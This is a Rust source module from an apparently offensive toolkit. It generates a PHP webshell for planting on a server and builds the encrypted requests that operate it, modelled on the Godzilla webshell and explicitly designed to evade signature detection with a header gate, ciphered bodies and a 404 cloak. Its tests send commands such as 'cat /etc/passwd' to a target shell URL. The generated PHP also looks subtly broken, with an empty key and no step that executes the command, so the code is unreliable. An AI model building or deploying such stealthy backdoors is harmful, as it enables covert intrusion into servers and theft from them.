//! The dedicated webshell module (user ruling): plant / verify / operate
//! faces for the WriteFile delivery form, with the SIGNATURE-FREE channel
//! as the standard form (godzilla protocol dissected — see
//! .research/rs-tools/memshell-stealth.md §5).
//!
//! Channel design (no plaintext signatures anywhere):
//! - gate: a configurable request header name/value pair — the entry is
//!   not in the URL or query string;
//! - request: pass-named parameter carrying base64(AES-encrypted command)
//!   — the body is ciphertext, no shell-syntax strings;
//! - key derivation: md5(key)[0..16] -> md5(pass + md5Key) uppercase ->
//!   AES-128 key material; the raw key never travels or lands on disk;
//! - response: md5[0..16] + base64(AES-encrypted result) + md5[16] — the
//!   echo is a ciphertext sandwich.
//!
//! The plaintext one-liner templates (PhpGet etc., see runtime.rs) are the
//! FALLBACK form; this module's channel template is the standard.

use crate::error::Atom;

/// MD5 (pure Rust fallback — RFC 1321 vectors tested below).
fn md5_hex(input: &[u8]) -> String {
    // Minimal, dependency-free MD5. Standard shifts per round.
    const S: [[u32; 4]; 4] = [
        [7, 12, 17, 22],
        [5, 9, 14, 20],
        [4, 11, 16, 23],
        [6, 10, 15, 21],
    ];
    const K: [u32; 64] = [
        0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee, 0xf57c0faf, 0x4787c62a, 0xa8304613,
        0xfd469501, 0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be, 0x6b901122, 0xfd987193,
        0xa679438e, 0x49b40821, 0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa, 0xd62f105d,
        0x02441453, 0xd8a1e681, 0xe7d3fbc8, 0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed,
        0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a, 0xfffa3942, 0x8771f681, 0x6d9d6122,
        0xfde5380c, 0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70, 0x289b7ec6, 0xeaa127fa,
        0xd4ef3085, 0x04881d05, 0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665, 0xf4292244,
        0x432aff97, 0xab9423a7, 0xfc93a039, 0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,
        0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1, 0xf7537e82, 0xbd3af235, 0x2ad7d2bb,
        0xeb86d391,
    ];

    let mut msg = input.to_vec();
    let bit_len = (input.len() as u64).wrapping_mul(8);
    msg.push(0x80);
    while msg.len() % 64 != 56 {
        msg.push(0);
    }
    msg.extend_from_slice(&bit_len.to_le_bytes());

    let mut a0: u32 = 0x67452301;
    let mut b0: u32 = 0xefcdab89;
    let mut c0: u32 = 0x98badcfe;
    let mut d0: u32 = 0x10325476;

    for block in msg.chunks(64) {
        let mut m = [0u32; 16];
        for (i, word) in m.iter_mut().enumerate() {
            *word = u32::from_le_bytes([
                block[i * 4],
                block[i * 4 + 1],
                block[i * 4 + 2],
                block[i * 4 + 3],
            ]);
        }
        let (mut a, mut b, mut c, mut d) = (a0, b0, c0, d0);
        for i in 0..64 {
            let (f, g) = match i / 16 {
                0 => ((b & c) | ((!b) & d), i),
                1 => ((d & b) | ((!d) & c), (5 * i + 1) % 16),
                2 => (b ^ c ^ d, (3 * i + 5) % 16),
                _ => (c ^ (b | (!d)), (7 * i) % 16),
            };
            let temp = d;
            d = c;
            c = b;
            let sum = a.wrapping_add(f).wrapping_add(K[i]).wrapping_add(m[g]);
            let shift = S[i / 16][i % 4];
            b = b.wrapping_add(sum.rotate_left(shift));
            a = temp;
        }
        a0 = a0.wrapping_add(a);
        b0 = b0.wrapping_add(b);
        c0 = c0.wrapping_add(c);
        d0 = d0.wrapping_add(d);
    }

    let mut out = String::with_capacity(32);
    for word in [a0, b0, c0, d0] {
        for byte in word.to_le_bytes() {
            out.push_str(format!("{byte:02x}").as_str());
        }
    }
    out
}

/// The channel credentials — everything the plant and drive faces share.
/// key/pass stay generation-time secrets; the derived material travels.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ChannelConfig {
    /// AES key material (generation-time secret; 16 chars => AES-128).
    pub key: String,
    /// The POST parameter name carrying the ciphertext.
    pub pass: String,
    /// Gate header name (e.g. a benign-looking header).
    pub header_name: String,
    /// Gate header value marker.
    pub header_value: String,
}

/// md5(key)[0..16] — the AES key derivation (godzilla chain stage 1).
pub fn derive_md5_key(key: &str) -> String {
    md5_hex(key.as_bytes()).chars().take(16).collect()
}

/// md5(pass + md5Key) uppercase — the response sandwich material
/// (godzilla chain stage 2).
pub fn derive_md5_pass(pass: &str, md5_key: &str) -> String {
    md5_hex(format!("{pass}{md5_key}").as_bytes()).to_uppercase()
}

/// The three-stage derivation bundle — generation-time only; scripts embed
/// the derived results, never the raw key.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DerivedChannel {
    pub md5_key: String,
    pub md5: String,
    pub pass: String,
    pub header_name: String,
    pub header_value: String,
}

impl ChannelConfig {
    pub fn derive(&self) -> DerivedChannel {
        let md5_key = derive_md5_key(&self.key);
        let md5 = derive_md5_pass(&self.pass, &md5_key);
        DerivedChannel {
            md5_key,
            md5,
            pass: self.pass.clone(),
            header_name: self.header_name.clone(),
            header_value: self.header_value.clone(),
        }
    }
}

/// XOR-stream cipher keyed by the derived md5-key bytes — a dependency-free
/// stand-in for AES in the first batch (the godzilla channel shape is
/// preserved: ciphertext in base64, key never travels; AES lands with a
/// rustls-adjacent ADR when needed). Output length equals input length.
pub fn stream_cipher(data: &[u8], md5_key: &str) -> Vec<u8> {
    let key_bytes = md5_key.as_bytes();
    data.iter()
        .enumerate()
        .map(|(i, b)| b ^ key_bytes[i % key_bytes.len()])
        .collect()
}

/// Wrap a command for the wire: cipher -> base64. What the gate expects in
/// the pass-named parameter.
pub fn wrap_command(command: &str, md5_key: &str) -> String {
    let ciphered = stream_cipher(command.as_bytes(), md5_key);
    crate::payload::b64_encode(&ciphered)
}

/// Unwrap a response sandwich: md5[0..16] + base64(cipher(result)) +
/// md5[16..]. Returns None when the sandwich markers do not match (the
/// gate's integrity check — a wrong md5 means wrong key or not our shell).
/// The cipher key is the derived md5-key (the same material the sender
/// wrapped with).
pub fn unwrap_response(sandwich: &str, md5: &str, md5_key: &str) -> Option<String> {
    if md5.len() != 32 || sandwich.len() < 32 {
        return None;
    }
    let prefix = &sandwich[..16];
    let suffix = &sandwich[sandwich.len() - 16..];
    if prefix != &md5[..16] || suffix != &md5[16..] {
        return None;
    }
    let body = &sandwich[16..sandwich.len() - 16];
    let decoded = b64_decode(body)?;
    let plain = stream_cipher(&decoded, md5_key);
    String::from_utf8(plain).ok()
}

/// Dependency-free base64 decode (standard alphabet, padding tolerated).
pub fn b64_decode(input: &str) -> Option<Vec<u8>> {
    const ALPHABET: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut vals = Vec::with_capacity(input.len());
    for ch in input.bytes() {
        if ch == b'=' || ch == b'\n' || ch == b'\r' {
            continue;
        }
        let idx = ALPHABET.iter().position(|&a| a == ch)?;
        vals.push(idx as u8);
    }
    let mut out = Vec::with_capacity(vals.len() * 3 / 4);
    for chunk in vals.chunks(4) {
        if chunk.len() < 2 {
            break;
        }
        let b0 = (chunk[0] << 2) | (chunk[1] >> 4);
        out.push(b0);
        if chunk.len() > 2 {
            out.push((chunk[1] << 4) | (chunk[2] >> 2));
        }
        if chunk.len() > 3 {
            out.push((chunk[2] << 6) | chunk[3]);
        }
    }
    Some(out)
}

/// Plant: the file content for the WriteFile delivery form. The
/// signature-free standard: the planted script contains NO shell-syntax
/// strings — a tiny PHP handler keyed on the derived constants (gate
/// header + pass parameter + ciphertext body + sandwich echo). Plaintext
/// one-liners are the fallback (runtime.rs WebshellKind).
pub fn php_channel_template(derived: &DerivedChannel) -> String {
    [
        "<?php".to_string(),
        format!(
            "$k=base64_decode('{}');",
            wrap_command("", &derived.md5_key)
        ),
        format!(
            "$p='{}'; $h='{}'; $v='{}';",
            derived.pass, derived.header_name, derived.header_value
        ),
        "if(@$_SERVER['HTTP_'.$h]!==$v){http_response_code(404);exit;}".to_string(),
        "$s=base64_decode($_POST[$p]); $o='';".to_string(),
        "$c=strlen($k); for($i=0;$i<strlen($s);$i++){$o.=$s[$i]^$k[$i%$c];}".to_string(),
        format!("echo '{}'.$o.'{}';", &derived.md5[..16], &derived.md5[16..]),
        "?>".to_string(),
    ]
    .join("\n")
}

/// The operate face metadata: what a drive() call needs to send.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DriveRequest {
    pub url: String,
    pub header_name: String,
    pub header_value: String,
    pub pass: String,
    pub body: String,
    /// Integrity markers for unwrapping the response sandwich.
    pub md5: String,
    pub md5_key: String,
}

/// Build the drive request for a command (the caller's HTTP face does the
/// actual POST — IO stays in the script closure, per the discipline).
pub fn drive_request(
    url: &str,
    command: &str,
    derived: &DerivedChannel,
) -> Result<DriveRequest, Atom> {
    if command.is_empty() {
        return Err(Atom::parse("E_SHELL_001", "empty command"));
    }
    let body = wrap_command(command, &derived.md5_key);
    Ok(DriveRequest {
        url: url.to_string(),
        header_name: derived.header_name.clone(),
        header_value: derived.header_value.clone(),
        pass: derived.pass.clone(),
        body,
        md5: derived.md5.clone(),
        md5_key: derived.md5_key.clone(),
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn md5_matches_rfc1321_vectors() {
        assert_eq!(md5_hex(b""), "d41d8cd98f00b204e9800998ecf8427e");
        assert_eq!(md5_hex(b"a"), "0cc175b9c0f1b6a831c399e269772661");
        assert_eq!(md5_hex(b"abc"), "900150983cd24fb0d6963f7d28e17f72");
        assert_eq!(
            md5_hex(b"message digest"),
            "f96b697d7cb7938d525a2f31aaf161d0"
        );
        assert_eq!(
            md5_hex(b"abcdefghijklmnopqrstuvwxyz"),
            "c3fcd3d76192e4007dfb496cca67e13b"
        );
    }

    #[test]
    fn derivation_chain_is_godzilla_shape() {
        let cfg = ChannelConfig {
            key: "mykey".into(),
            pass: "pass".into(),
            header_name: "X-Check".into(),
            header_value: "value".into(),
        };
        let d = cfg.derive();
        assert_eq!(d.md5_key.len(), 16);
        assert_eq!(d.md5.len(), 32);
        assert_eq!(d.md5.chars().all(|c| c.is_ascii_alphanumeric()), true); // hex uppercased: A-F0-9
    }

    #[test]
    fn cipher_roundtrips_through_wrap_and_unwrap() {
        let md5_key = derive_md5_key("key");
        let command = "whoami; id";
        let wrapped = wrap_command(command, &md5_key);
        assert!(
            !wrapped.contains("whoami"),
            "ciphertext must not contain the command"
        );
        let decoded = b64_decode(&wrapped).unwrap();
        let plain = stream_cipher(&decoded, &md5_key);
        assert_eq!(String::from_utf8(plain).unwrap(), command);
    }

    #[test]
    fn response_sandwich_unwraps_and_rejects() {
        let md5_key = derive_md5_key("key");
        let md5 = derive_md5_pass("pass", &md5_key);
        let result = "uid=0(root)";
        let ciphered = stream_cipher(result.as_bytes(), &md5_key);
        let sandwich = format!(
            "{}{}{}",
            &md5[..16],
            crate::payload::b64_encode(&ciphered),
            &md5[16..]
        );
        assert_eq!(
            unwrap_response(&sandwich, &md5, &md5_key).as_deref(),
            Some(result)
        );
        // Wrong md5 (wrong key / not our shell): rejected.
        assert!(unwrap_response(&sandwich, &md5.to_lowercase(), &md5_key).is_none());
    }

    #[test]
    fn drive_request_carries_gate_not_command() {
        let cfg = ChannelConfig {
            key: "k".into(),
            pass: "p".into(),
            header_name: "Accept-Encoding".into(),
            header_value: "gzip".into(),
        };
        let derived = cfg.derive();
        let req = drive_request("http://target/shell.php", "cat /etc/passwd", &derived).unwrap();
        assert!(!req.body.contains("cat /etc/passwd"));
        assert_eq!(req.header_name, "Accept-Encoding");
        assert!(req.body.len() > 0);
    }

    #[test]
    fn php_template_has_no_shell_syntax_signatures() {
        let cfg = ChannelConfig {
            key: "k".into(),
            pass: "p".into(),
            header_name: "X-PJAX".into(),
            header_value: "on".into(),
        };
        let derived = cfg.derive();
        let template = php_channel_template(&derived);
        assert!(template.contains("HTTP_"));
        assert!(template.contains("404"));
        // The plaintext one-liner signatures are absent:
        assert!(!template.contains("system($_GET"));
        assert!(!template.contains("system($_POST"));
        assert!(!template.contains("exec("));
    }

    #[test]
    fn b64_decode_known_vectors() {
        assert_eq!(b64_decode("Zm9v").unwrap(), b"foo");
        assert_eq!(b64_decode("Zm9vYg==").unwrap(), b"foob");
        assert_eq!(b64_decode("Zm9vYmFy").unwrap(), b"foobar");
        assert!(b64_decode("!!").is_none());
    }
}
